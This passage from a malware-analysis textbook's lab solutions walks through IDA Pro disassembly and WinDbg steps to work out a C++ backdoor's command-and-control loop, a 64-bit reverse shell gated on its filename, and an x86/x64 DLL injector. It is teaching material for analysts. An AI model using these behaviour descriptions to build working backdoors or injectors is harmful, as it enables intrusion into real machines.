<p class="calibre1">004031D0                 call    __CxxThrowException@8 ; _CxxThrowException(x,x) <i class="calibre4">Listing 20-9L: An exception being created and thrown</i> Based on the call to CreateFileA with the  <i class="calibre4">config.dat</i> filename, we guess that this function reads the configuration file from disk, and we rename it setupConfig. The code in Listing 20-9L tries to open the  <i class="calibre4">config.dat</i> file at . </p>
<p class="calibre1">If the file is opened successfully, a jump is taken, and the remainder of the code in Listing 20-9L is skipped, as shown at . If the file is not opened successfully, we see the string Config error passed as an argument to the function at 0x4036F0 at . </p>
<p class="calibre1">The function at 0x4036F0 takes the strings as a parameter, but also uses ECX as the this pointer. A reference to the object used by the this pointer is stored on the stack at var_AC at . We later see that object passed to the <b class="calibre3">20</b></p>
<p class="calibre1">CxxThrowException function at , which tells us that the function at 0x4036F0 </p>
<p class="calibre1">is a member function of an exception object. Based on the context in which sub_4036F0 is called, we can assume that the function is initializing an exception with the string Config error. </p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">719</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p753"/>It’s important to recognize the function call with an error string argument followed by a call to CxxThrowException because similar code consisting of an error string passed to a function followed by a call to CxxThrowException appears throughout this program. Each time we see this pattern, we can conclude that the function is initializing an exception, so we don’t need to waste time analyzing these functions. </p>
<p class="calibre1">If we continue analyzing the function at 0x403180, we realize that it reads data from the configuration file  <i class="calibre4">config.dat</i> and stores it in secondObject. </p>
<p class="calibre1">We can now conclude that secondObject is an object to store and read configuration information, and we rename it configObject. </p>
<p class="calibre1">Now we return to sub_401EE0 to see if we can better determine how firstObject is used. After creating the configObject object, sub_401EE0 stores a bunch of information in firstObject, as shown in Listing 20-10L. </p>
<p class="calibre1">00401F2A</p>
<p class="calibre1">mov</p>
<p class="calibre1">[esi], eax</p>
<p class="calibre1">00401F2C</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+10h], offset aIndex_html ; "/index.html" </p>
<p class="calibre1">00401F33</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+14h], offset aInfo_html ; "/info.html" </p>
<p class="calibre1">00401F3A</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+18h], offset aResponse_html ; "/response.html" </p>
<p class="calibre1">00401F41</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+1Ch], offset aGet_html ; "/get.html" </p>
<p class="calibre1">00401F48</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+20h], offset aPut_html ; "/put.html" </p>
<p class="calibre1">00401F4F</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+24h], offset aSrv_html ; "/srv.html" </p>
<p class="calibre1">00401F56</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+28h], 544F4349h</p>
<p class="calibre1">00401F5D</p>
<p class="calibre1">mov</p>
<p class="calibre1">dword ptr [esi+2Ch], 41534744h</p>
<p class="calibre1">00401F64</p>
<p class="calibre1">mov</p>
<p class="calibre1">eax, esi</p>
<p class="calibre1"> <i class="calibre4">Listing 20-10L: Data being stored in firstObject</i></p>
<p class="calibre1">First, eax is stored in firstObject, formerly a pointer to configObject. </p>
<p class="calibre1">Next, we see a series of hard-coded URL paths, then two hard-coded integers, and then the function returns a pointer to firstObject. We still can’t be completely sure what firstObject does, but it appears to store all of the program’s global data, so we’ll rename this object globalDataObject for now, until we can learn enough to give it a better name. </p>
<p class="calibre1">We have now finished analyzing the first function called by main2. We have determined that it loads the configuration information from a file and initializes an object that stores the global data for the program. Having analyzed the first function that it calls, we can now return to main2. The remainder of main2 is shown in Listing 20-11L. </p>
<p class="calibre1">00403C2D               mov     ecx, esi</p>
<p class="calibre1">00403C2F                 mov     byte ptr [ebp+var_4], bl 00403C32                 call    sub_401F80</p>
<p class="calibre1">00403C37                 mov     edi, ds:Sleep</p>
<p class="calibre1">00403C3D loc_403C3D:</p>
<p class="calibre1">00403C3D                 mov     eax, [esi]</p>
<p class="calibre1">00403C3F                 mov     eax, [eax+190h]</p>
<p class="calibre1">00403C45                 lea     eax, [eax+eax*4]</p>
<p class="calibre1">00403C48                 lea     eax, [eax+eax*4]</p>
<p class="calibre1">00403C4B                 lea     ecx, [eax+eax*4]</p>
<p class="calibre1">00403C4E                 shl     ecx, 2</p>
<p class="calibre1">00403C51                 push    ecx             ; dwMilliseconds <b class="calibre3">720</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p754"/>00403C52                 call    edi ; Sleep 00403C54               mov     ecx, esi</p>
<p class="calibre1">00403C56                 call    loc_402410</p>
<p class="calibre1">00403C5B                 inc     ebx</p>
<p class="calibre1">00403C5C                 jmp     short loc_403C3D</p>
<p class="calibre1"> <i class="calibre4">Listing 20-11L: Beacon and poll commands in the main2 function</i> We see that this function calls sub_401F80 outside the loop, and then it calls sub_402410 and the Sleep function inside an infinite loop. From what we know about the program from the strings, we could guess that sub_401F80 </p>
<p class="calibre1">sends a beacon to the remote machine and that sub_402410 polls the remote server. We’ll rename those functions maybe_beacon and maybe_poll. We see that maybe_beacon and maybe_poll are both passed our globalDataObject in the ECX </p>
<p class="calibre1">pointer (at  and ), and that they are member functions of what we’ve called globalDataObject. Based on this realization, we’ll rename our object mainObject. </p>
<p class="calibre1">First, we’ll analyze maybe_beacon. We see that it creates another new object and calls sub_403D50, as shown in Listing 20-12L. </p>
<p class="calibre1">00401FC8                 mov   eax, [esi]</p>
<p class="calibre1">00401FCA                 mov   edx, [eax+144h]</p>
<p class="calibre1">00401FD0                 add   eax, 104h</p>
<p class="calibre1">00401FD5                 push    edx             ; hostshort 00401FD6                 push    eax             ; char *</p>
<p class="calibre1">00401FD7                 call    sub_403D50</p>
<p class="calibre1"> <i class="calibre4">Listing 20-12L: First function call in the maybe_beacon function</i> We see that IDA Pro has labeled some of the arguments to sub_403D50 </p>
<p class="calibre1">because it knows they will be used as parameters to imported functions later. </p>
<p class="calibre1">The most telling of these is hostshort, which tells us that it will be used as a parameter to the networking function htons. The values for these parameters are retrieved from our mainObject, which was stored in ESI. </p>
<p class="calibre1">We see that ESI is dereferenced at  to obtain a pointer to configObject, which is stored at offset 0 in the mainObject. Next, the hostshort is retrieved at an offset of +144 into configObject at , and char * is stored within configObject at offset 0x248 at  (0x104 + 0x144). This level of indirection is common in C++ programs. In a C program, these values would be stored as global data with offsets that are labeled and tracked by IDA Pro, but in C++ they are stored as offsets into objects that are harder to track. </p>
<p class="calibre1">In order to determine the data that will be pushed onto the stack, we would need to go back to the function that initializes configObject to see what is stored at offsets 0x144 and 0x248. In practice, it’s often easier to use dynamic analysis to determine those values, but without access to the command-and-control server, you may need to go back to configObject. </p>
<p class="calibre1"><b class="calibre3">20</b></p>
<p class="calibre1">Looking at sub_403D50, we see that it calls htons, socket, and connect to establish a connection to a remote socket. maybe_beacon then calls sub_402FF0, which contains the code shown in Listing 20-13L. </p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">721</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p755"/>0040301C</p>
<p class="calibre1">call    ds:GetComputerNameA</p>
<p class="calibre1">00403022</p>
<p class="calibre1">test    eax, eax</p>
<p class="calibre1">00403024</p>
<p class="calibre1">jnz     short loc_403043</p>
<p class="calibre1">00403026</p>
<p class="calibre1">push</p>
<p class="calibre1">offset aErrorConductin ; "Error conducting machine survey" </p>
<p class="calibre1">0040302B</p>
<p class="calibre1">lea     ecx, [esp+40h+var_1C]</p>
<p class="calibre1">0040302F</p>
<p class="calibre1">call    sub_403910</p>
<p class="calibre1">00403034</p>
<p class="calibre1">lea     eax, [esp+3Ch+var_1C]</p>
<p class="calibre1">00403038</p>
<p class="calibre1">push    offset unk_411150</p>
<p class="calibre1">0040303D</p>
<p class="calibre1">push    eax</p>
<p class="calibre1">0040303E</p>
<p class="calibre1">call    __CxxThrowException@8 ; _CxxThrowException(x,x)</p>
<p class="calibre1"> <i class="calibre4">Listing 20-13L: Beginning of the victim survey function</i> We see from this code that the function is trying to obtain the computer’s hostname. If it fails to do so, it throws an exception with the error message “Error conducting machine survey.” This tells us that this function is conducting a survey of the victim’s machine. </p>
<p class="calibre1">The remainder of sub_402FF0 shows the malware gathering additional victim information. We can now rename sub_402FF0 to surveyVictim and move on. </p>
<p class="calibre1">Next, we analyze the function called by maybe_beacon, which calls sub_404ED0. </p>
<p class="calibre1">From the error message, we can see that sub_404ED0 does an HTTP POST to the remote server. maybe_beacon then calls sub_404B10, which from the error messages we can see is checking the beacon response. Without going into too much detail, we can tell that maybe_beacon is, in fact, the beacon function and that it expects a specific beacon response in order for the program to continue running. </p>
<p class="calibre1">We return to main2 to check the maybe_poll (0x402410) function. We see that its first call is to sub_403D50, which we analyzed earlier and know initializes a connection to the command-and-control server. The maybe_poll function then calls sub_404CF0, which sends an HTTP GET in order to retrieve information from the remote server. It then calls sub_404B10, which retrieves the server’s response to the HTTP GET request. We then see two blocks of code that raise an exception if the response doesn’t meet certain formatting criteria. </p>
<p class="calibre1">Next, we come across a switch statement with six options, as shown in Listing 20-14L. </p>
<p class="calibre1">0040251F                 mov     al, [esi+4]</p>
<p class="calibre1">00402522                 add     eax, -61h       ; switch 6 cases 00402525                 cmp     eax, 5</p>
<p class="calibre1">00402528                 ja      short loc_40257D ; default 0040252A                 jmp     ds:off_4025C8[eax*4] ; switch jump <i class="calibre4">Listing 20-14L: switch statements inside the maybe_poll function</i> The value used for the switch decision is stored in [esi+4]. That value is then stored in EAX, and 0x61 is subtracted from it. If the value is not lower than five, none of the switch jumps are taken. This ensures that the value is between 0x61 and 0x66 (which represents ASCII characters  <i class="calibre4">a</i> through  <i class="calibre4">f </i>). </p>
<p class="calibre1">0x61 less than the value is then used as an offset into the switch table. IDA Pro has recognized and labeled the switch table. </p>
<p class="calibre1"><b class="calibre3">722</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p756"/>We click off_4025C8, which takes us to the six possible locations that we need to analyze. We’ll label these case_1 through case_6 and analyze them one at a time: </p>
<p class="calibre1"></p>
<p class="calibre1">case_1 calls the delete operator and then immediately returns without actually doing anything. We’ll rename this case_doNothing. </p>
<p class="calibre1"></p>
<p class="calibre1">case_2 calls atoi to parse a string into a number, and then calls the sleep function before returning. We’ll rename it case_sleep. </p>
<p class="calibre1"></p>
<p class="calibre1">case_3 does some string parsing, and then calls CreateProcess. We’ll rename it case_ExecuteCommand. </p>
<p class="calibre1"></p>
<p class="calibre1">case_4 calls CreateFile and writes the HTTP response received from the command-and-control server to disk. We’ll rename it case_downloadFile. </p>
<p class="calibre1"></p>
<p class="calibre1">case_5 also calls CreateFile, but it uploads the data from the file to the remote server using an HTTP POST command. We’ll rename it case_uploadFile. </p>
<p class="calibre1"></p>
<p class="calibre1">case_6 calls GetComputerName, GetUserName, GetVersionEx, and GetDefaultLCID, which together perform a survey of the victim’s machine and send the results back to the command-and-control server. </p>
<p class="calibre1">Overall, we have a backdoor program that reads a configuration file that determines the command-and-control server, sends a beacon to the command-and-control server, and implements several different functions based on the response from the command-and-control server. </p>
<p class="calibre1"><b class="calibre3">Lab 21-1 Solutions</b></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Short Answers</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">When you run the program without any parameters, it exits immediately. </p>
<p class="calibre1">2. </p>
<p class="calibre1">The main function is located at 0x00000001400010C0. You can spot the call to main by looking for a function call that accepts an integer and two pointers as parameters. </p>
<p class="calibre1">3. </p>
<p class="calibre1">The string ocl.exe is stored on the stack. </p>
<p class="calibre1">4. </p>
<p class="calibre1">To have this program run its payload without changing the filename of the executable, you can patch the jump instruction at 0x0000000140001213 so that it is a NOP instead. </p>
<p class="calibre1">5. </p>
<p class="calibre1">The name of the executable is being compared against the string jzm.exe by the call to strncmp at 0x0000000140001205. </p>
<p class="calibre1">6. </p>
<p class="calibre1">The function at 0x00000001400013C8 takes one parameter, which contains the socket created to the remote host. </p>
<p class="calibre1">7. </p>
<p class="calibre1">The call to CreateProcess takes 10 parameters. We can’t tell from the IDA Pro listing because we can’t distinguish between things being stored on the stack and things being used in a function call, but the function is documented in MSDN as always taking 10 parameters. </p>
<p class="calibre1"><b class="calibre3">2 1</b></p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">723</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p757"/> <i class="calibre4"><b class="calibre3">Detailed Analysis</b></i></p>
<p class="calibre1">When we try to run this program to perform dynamic analysis, it immediately exits, so we open the program and try to find the main method. (You won’t need to do this if you have the latest version of IDA Pro; if you have an older version, you may need to find the main method.) </p>
<p class="calibre1">We begin our analysis at 0x0000000140001750, the entry point as specified in the PE header, as shown in Listing 21-1L. </p>
<p class="calibre1">0000000140001750         sub     rsp, 28h</p>
<p class="calibre1">0000000140001754         call    sub_140002FE4 </p>
<p class="calibre1">0000000140001759         add     rsp, 28h</p>
<p class="calibre1">000000014000175D         jmp     sub_1400015D8 </p>
<p class="calibre1"> <i class="calibre4">Listing 21-1L: Entry point of </i> Lab21-01.exe</p>
<p class="calibre1">We know that the main method takes three parameters: argc, argv, and envp. Furthermore, we know that argc will be a 32-bit value, and that argv and envp will be 64-bit values. Because the function call at  does not take any parameters, we know that it can’t be the main method. We quickly check the function and see that it calls only functions imported from other DLLs, so we know that the call to main must be after the jmp instruction at . </p>
<p class="calibre1">We follow the jump and scroll down looking for a function that takes three parameters. We pass many function calls without parameters and eventually find the call to the main method, as shown in Listing 21-2L. This call takes three parameters. The first at  is a 32-bit value representing an int, and the next two parameters at  and  are 64-bit values representing pointers. </p>
<p class="calibre1">00000001400016F3         mov     r8, cs:qword_14000B468 </p>
<p class="calibre1">00000001400016FA         mov     cs:qword_14000B470, r8</p>
<p class="calibre1">0000000140001701         mov     rdx, cs:qword_14000B458 </p>
<p class="calibre1">0000000140001708         mov     ecx, cs:dword_14000B454 </p>
<p class="calibre1">000000014000170E         call    sub_1400010C0</p>
<p class="calibre1"> <i class="calibre4">Listing 21-2L: Call to the main method of </i> Lab21-01.exe <i class="calibre4"> </i></p>
<p class="calibre1">We can now move on to the main function. Early in the main function, we see a lot of data moved onto the stack, including the data shown in Listing 21-3L. </p>
<p class="calibre1">0000000140001150         mov     byte ptr [rbp+250h+var_160+0Ch], 0</p>
<p class="calibre1">0000000140001157         mov     [rbp+250h+var_170], 2E6C636Fh 0000000140001161         mov     [rbp+250h+var_16C], 657865h <i class="calibre4">Listing 21-3L: ASCII string being loaded on the stack that has not been recognized by</i> <i class="calibre4">IDA Pro</i></p>
<p class="calibre1">You should immediately notice that that numbers being moved onto the stack represent ASCII characters. The value 0x2e is a period (.), and the hexadecimal values starting with 3, 4, 5, and 6 are mostly letters. Right-click the <b class="calibre3">724</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p758"/>numbers to have IDA Pro show which characters are represented, and press R on each line to change the display. After changing the display so that the ASCII characters are labeled properly by IDA Pro, the code should look like Listing 21-4L. </p>
<p class="calibre1">0000000140001150         mov     byte ptr [rbp+250h+var_160+0Ch], 0</p>
<p class="calibre1">0000000140001157         mov     [rbp+250h+var_170], '.lco' </p>
<p class="calibre1">0000000140001161         mov     [rbp+250h+var_16C], 'exe' </p>
<p class="calibre1"> <i class="calibre4">Listing 21-4L: Listing 21-3L with the ASCII characters labeled properly by IDA Pro</i> This view tells us that the code is storing the string ocl.exe on the stack. </p>
<p class="calibre1">(Remember that x86 and x64 assembly are little-endian, so when ASCII data is represented as if it were a 32-bit number, the characters are reversed.) These three mov instructions together store the bytes representing  <i class="calibre4">ocl.exe</i> on the stack. </p>
<p class="calibre1">Recall that  <i class="calibre4">Lab09-02.exe</i> won’t run properly unless the executable name is  <i class="calibre4">ocl.exe</i>. At this point, we try renaming the file  <i class="calibre4">ocl.exe</i> and running it, but that doesn’t work, so we need to continue analyzing the code in IDA Pro. </p>
<p class="calibre1">As we continue our analysis, we see that the code calls strrchr, as in Lab 9-2, to obtain the executable’s filename without the leading directory path. Then we see an encoding function, partially shown in Listing 21-5L. </p>
<p class="calibre1">00000001400011B8         mov     eax, 4EC4EC4Fh</p>
<p class="calibre1">00000001400011BD         sub     cl, 61h</p>
<p class="calibre1">00000001400011C0         movsx   ecx, cl</p>
<p class="calibre1">00000001400011C3         imul    ecx, ecx</p>
<p class="calibre1">00000001400011C6         sub     ecx, 5</p>
<p class="calibre1">00000001400011C9         imul    ecx</p>
<p class="calibre1">00000001400011CB         sar     edx, 3</p>
<p class="calibre1">00000001400011CE         mov     eax, edx</p>
<p class="calibre1">00000001400011D0         shr     eax, 1Fh</p>
<p class="calibre1">00000001400011D3         add     edx, eax</p>
<p class="calibre1">00000001400011D5         imul    edx, 1Ah</p>
<p class="calibre1">00000001400011D8         sub     ecx, edx</p>
<p class="calibre1"> <i class="calibre4">Listing 21-5L: An encoding function</i></p>
<p class="calibre1">This encoding function would be very tedious to analyze, so we note it and move on to see what is done with the encoded string. We scroll down a little further to a call to strncmp, as shown in Listing 21-6L. </p>
<p class="calibre1">00000001400011F4         lea     rdx, [r11+1]    ; char *</p>
<p class="calibre1">00000001400011F8         lea     rcx, [rbp+250h+var_170] ; char *</p>
<p class="calibre1">00000001400011FF         mov     r8d, 104h       ; size_t 0000000140001205         call    strncmp</p>
<p class="calibre1">000000014000120A         test    eax, eax</p>
<p class="calibre1">000000014000120C         jz      short loc_140001218 </p>
<p class="calibre1">000000014000120E</p>
<p class="calibre1">000000014000120E loc_14000120E:                  ; CODE XREF: main+16Aj <b class="calibre3">2 1</b></p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">725</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p759"/><img src="index-759_1.png" alt="Image 157" class="calibre2"/></p>
<p class="calibre1">000000014000120E         mov     eax, 1</p>
<p class="calibre1">0000000140001213         jmp     loc_1400013D7 </p>
<p class="calibre1"> <i class="calibre4">Listing 21-6L: Code that compares the filename against the encoded string and takes one</i> <i class="calibre4">of two different code paths</i></p>
<p class="calibre1">Scrolling up to see which two strings are being compared, we discover that the first string is the name of the malware being executed and the second is the encoded string. Based on the return value of strncmp, we either take the jump at , which continues to more interesting code, or we take the jump at , which prematurely exits the program. </p>
<p class="calibre1">In order to analyze the program dynamically, we need to get it to continue running without exiting prematurely. We could patch the jmp instruction at  in order to force the code to continue executing even if the program name is incorrect. Unfortunately, OllyDbg does not work with 64-bit executables, so we would need to use a hex editor to edit the bytes manually. </p>
<p class="calibre1">Instead of patching the code, we can try to determine the correct string and rename our process, as we did in Lab 9-2. </p>
<p class="calibre1">To determine the string that the malware is searching, we can use dynamic analysis to obtain the encoded value that the executable should be named. To do so, we use WinDbg (again, because OllyDbg does not support 64-bit executables). We open the program in WinDbg and set a breakpoint on the call to strncmp, as shown in Figure 21-1L. </p>
<p class="calibre1"/>
<p class="calibre1"/>
<p class="calibre1"/>
<p class="calibre1"/>
<p class="calibre1"/>
<p class="calibre1"> <i class="calibre4">Figure 21-1L: Using WinDbg to see the string that is being compared in Lab 21-1</i></p>
<p class="calibre1">WinDbg output can sometimes be a bit verbose, so we’ll focus on the commands issued. We can’t set a breakpoint using bp strncmp because WinDbg doesn’t know the location of strncmp. However, IDA Pro uses signatures to find strncmp, and from Listing 21-6L, we know that the call to strncmp is at 0000000140001205. As shown in Figure 21-1L, at , we use the u instruction to verify the instructions at 0000000140001205, and then set a breakpoint on <b class="calibre3">726</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p760"/>that location at  and issue the g (go) command at . When the breakpoint is hit, we enter <b class="calibre3">da rcx</b> to obtain the string at . At , we see that the string being compared is jzm.exe. </p>
<p class="calibre1">Now that we know how to get the program to run, we can continue analyzing it. We see the following import calls in order: WSAStartup, WSASocket, gethostbyname, htons, and connect. Without spending much effort analyzing the actual code, we can tell from the function calls that the program is connecting to a remote socket. Then we see another function call that we must analyze, as shown in Listing 21-7L. </p>
<p class="calibre1">00000001400013BD         mov     rcx, rbx </p>
<p class="calibre1">00000001400013C0         movdqa  oword ptr [rbp+250h+var_160], xmm0</p>
<p class="calibre1">00000001400013C8         call    sub_140001000</p>
<p class="calibre1"> <i class="calibre4">Listing 21-7L: A 64-bit function call with an unclear number of parameters</i> At , the RBX register is moved into RCX. We can’t be sure if this is just normal register movement or if this is a function parameter. Looking back to see what is stored in RBX, we discover that it stores the socket that was returned by WSASocket. Once we start to analyze the function at 0x0000000140001000, we see that value used as a parameter to CreateProcessA. </p>
<p class="calibre1">The call to CreateProcessA is shown in Listing 21-8L. </p>
<p class="calibre1">0000000140001025         mov     [rsp+0E8h+hHandle], rax 000000014000102A         mov     [rsp+0E8h+var_90], rax</p>
<p class="calibre1">000000014000102F         mov     [rsp+0E8h+var_88], rax</p>
<p class="calibre1">0000000140001034         lea     rax, [rsp+0E8h+hHandle]</p>
<p class="calibre1">0000000140001039         xor     r9d, r9d        ; lpThreadAttributes 000000014000103C         xor     r8d, r8d        ; lpProcessAttributes 000000014000103F         mov     [rsp+0E8h+var_A0], rax</p>
<p class="calibre1">0000000140001044         lea     rax, [rsp+0E8h+var_78]</p>
<p class="calibre1">0000000140001049         xor     ecx, ecx        ; lpApplicationName 000000014000104B         mov     [rsp+0E8h+var_A8], rax </p>
<p class="calibre1">0000000140001050         xor     eax, eax</p>
<p class="calibre1">0000000140001052         mov     [rsp+0E8h+var_78], 68h</p>
<p class="calibre1">000000014000105A         mov     [rsp+0E8h+var_B0], rax</p>
<p class="calibre1">000000014000105F         mov     [rsp+0E8h+var_B8], rax</p>
<p class="calibre1">0000000140001064         mov     [rsp+0E8h+var_C0], eax</p>
<p class="calibre1">0000000140001068         mov     [rsp+0E8h+var_C8], 1</p>
<p class="calibre1">0000000140001070         mov     [rsp+0E8h+var_3C], 100h 000000014000107B         mov     [rsp+0E8h+var_28], rbx </p>
<p class="calibre1">0000000140001083         mov     [rsp+0E8h+var_18], rbx </p>
<p class="calibre1">000000014000108B         mov     [rsp+0E8h+var_20], rbx </p>
<p class="calibre1">0000000140001093         call    cs:CreateProcessA</p>
<p class="calibre1"> <i class="calibre4">Listing 21-8L: A 64-bit call to CreateProcessA</i></p>
<p class="calibre1">The socket is stored at RBX in code not shown in the listing. All the parameters are moved onto the stack instead of pushed onto the stack, which makes the function call considerably more complicated than the 32-bit version. </p>
<p class="calibre1"><b class="calibre3">2 1</b></p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">727</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p761"/>Most of the moves onto the stack represent parameters to CreateProcessA, but some do not. For example, the move at  is LPSTARTUPINFO being passed as a parameter to CreateProcessA. However, the STARTUPINFO structure itself is stored on the stack, starting at var_78. The mov instructions seen at , , and  are values being moved into the STARTUPINFO structure, which happens to be stored on the stack, and not individual parameters for CreateProcessA. </p>
<p class="calibre1">Because of all the intermingling of function parameters and other stack activity, it’s difficult to tell how many parameters are passed to a function just by looking at the function call. However, because CreateProcessA is documented, we know that it takes exactly 10 parameters. </p>
<p class="calibre1">At this point, we’ve reached the end of the code. We’ve learned that the malware checks to see if the program is  <i class="calibre4">jzm.exe</i>, and if so, it creates a reverse shell to a remote computer to enable remote access on the machine. </p>
<p class="calibre1"><b class="calibre3">Lab 21-2 Solutions</b></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Short Answers</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">The malware contains the resource sections X64, X64DLL, and X86. Each of the resources contains an embedded PE file. </p>
<p class="calibre1">2. </p>
<p class="calibre1"> <i class="calibre4">Lab21-02.exe</i> is compiled for a 32-bit system. This is shown in the PE </p>
<p class="calibre1">header’s Characteristics field, where the IMAGE_FILE_32BIT_MACHINE flag is set. </p>
<p class="calibre1">3. </p>
<p class="calibre1">The malware attempts to resolve and call IsWow64Process to determine if it is running on an x64 system. </p>
<p class="calibre1">4. </p>
<p class="calibre1">On an x86 machine, the malware drops the X86 resource to disk and injects it into  <i class="calibre4">explorer.exe</i>. On an x64 machine, the malware drops two files from the X64 and X64DLL resource sections to disk and launches the executable as a 64-bit process. </p>
<p class="calibre1">5. </p>
<p class="calibre1">On an x86 system, the malware drops  <i class="calibre4">Lab21-02.dll</i> into the Windows system directory, which will typically be  <i class="calibre4">C:\Windows\System32\</i>. </p>
<p class="calibre1">6. </p>
<p class="calibre1">On an x64 system, the malware drops  <i class="calibre4">Lab21-02x.dll</i> and  <i class="calibre4">Lab21-02x.exe</i> into the Windows system directory, but because this is a 32-bit process running in WOW64, the directory is  <i class="calibre4">C:\Windows\SysWOW64\</i>. </p>
<p class="calibre1">7. </p>
<p class="calibre1">On an x64 system, the malware launches  <i class="calibre4">Lab21-02x.exe</i>, which is a 64-bit process. You can see this in the PE header, where the Characteristics field has the IMAGE_FILE_64BIT_MACHINE flag set. </p>
<p class="calibre1">8. </p>
<p class="calibre1">On both x64 and x86 systems, the malware performs DLL injection into <i class="calibre4">explorer.exe</i>. On an x64 system, it drops and runs a 64-bit binary to inject a 64-bit DLL into the 64-bit running  <i class="calibre4">explorer.exe</i>. On an x86 system, it injects a 32-bit DLL into the 32-bit running  <i class="calibre4">explorer.exe</i>. </p>
<p class="calibre1"><b class="calibre3">728</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p762"/><img src="index-762_1.png" alt="Image 158" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Detailed Analysis</b></i></p>
<p class="calibre1">Because this malware is the same as  <i class="calibre4">Lab12-01.exe</i> except with an added x64 </p>
<p class="calibre1">component, a good place to begin our analysis is with Lab 12-1. Let’s start by examining the new strings found in this binary, as follows: IsWow64Process</p>
<p class="calibre1">Lab21-02x.dll</p>
<p class="calibre1">X64DLL</p>
<p class="calibre1">X64</p>
<p class="calibre1">X86</p>
<p class="calibre1">Lab21-02x.exe</p>
<p class="calibre1">Lab21-02.dll</p>
<p class="calibre1">We see a couple of strings that reference x64, as well as the string IsWow64Process, an API call that can tell malware if it is running as a 32-bit process on a 64-bit machine. We also see three suspicious filenames: Lab21-02.dll, Lab21-02x.dll, and Lab21-02x.exe. </p>
<p class="calibre1">Next, we look at the malware in PEview, as shown in Figure 21-2L. </p>
<p class="calibre1"> <i class="calibre4">Figure 21-2L: PEview showing three different resource sections</i> We see three different resource sections: X64, X64DLL, and X86. Each appears to contain an embedded PE format file, as evidenced by the MZ </p>
<p class="calibre1">header and DOS stub. If we perform a quick dynamic analysis of this malware on x86 and x64 systems, they both produce the annoying pop-ups just like Lab 12-1. </p>
<p class="calibre1">Next, we move our analysis to IDA Pro to find out how the malware uses IsWow64Process. We see that  <i class="calibre4">Lab21-02.exe</i> begins with the same code as  <i class="calibre4">Lab12-01.exe</i>, which dynamically resolves the API functions for iterating through the process list. After those functions are resolved, the code deviates and attempts to dynamically resolve the IsWow64Process function, as shown in Listing 21-9L. </p>
<p class="calibre1">004012F2         push    offset aIswow64process  ; "IsWow64Process" </p>
<p class="calibre1">004012F7         push    offset ModuleName       ; "kernel32" </p>
<p class="calibre1">004012FC         mov     [ebp+var_10], 0</p>
<p class="calibre1">00401303         call    ebx ; GetModuleHandleA </p>
<p class="calibre1">00401305         push    eax             ; hModule</p>
<p class="calibre1">00401306         call    edi ; GetProcAddress </p>
<p class="calibre1">00401308         mov     myIsWow64Process, eax</p>
<p class="calibre1"><b class="calibre3">2 1</b></p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">729</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p763"/>0040130D         test    eax, eax </p>
<p class="calibre1">0040130F         jz      short loc_401322</p>
<p class="calibre1">00401311         lea     edx, [ebp+var_10]</p>
<p class="calibre1">00401314         push    edx</p>
<p class="calibre1">00401315         call    ds:GetCurrentProcess</p>
<p class="calibre1">0040131B         push    eax</p>
<p class="calibre1">0040131C         call    myIsWow64Process </p>
<p class="calibre1"> <i class="calibre4">Listing 21-9L: Dynamically resolving IsWow64Process and calling it</i> At , the malware obtains a handle to  <i class="calibre4">kernel32.dll</i> and calls GetProcAddress at  in order to try to resolve IsWow64Process. If it succeeds, it loads the address of the function into myIsWow64Process. </p>
<p class="calibre1">The test at  is used to determine if the malware found the IsWow64Process function, which is available only on newer OSs. The malware does this resolution check first for compatibility with older systems that do not support IsWow64Process. Next, the malware gets its own PID using GetCurrentProcess, and then calls IsWow64Process at , which will return true in var_10 only if the process is a 32-bit application running under WOW64. </p>
<p class="calibre1">Based on the result of the IsWow64Process check, there are two code paths for the malware to take: x86 and x64. We’ll begin our analysis with the x86 path. </p>
<p class="calibre1"><b class="calibre3">X86 Code Path</b></p>
<p class="calibre1">The x86 code path first passes the strings Lab21-02.dll and X86 to sub_401000. </p>
<p class="calibre1">Based on our static analysis, we can guess and rename this function extractResource, as shown in Listing 21-10L at . </p>
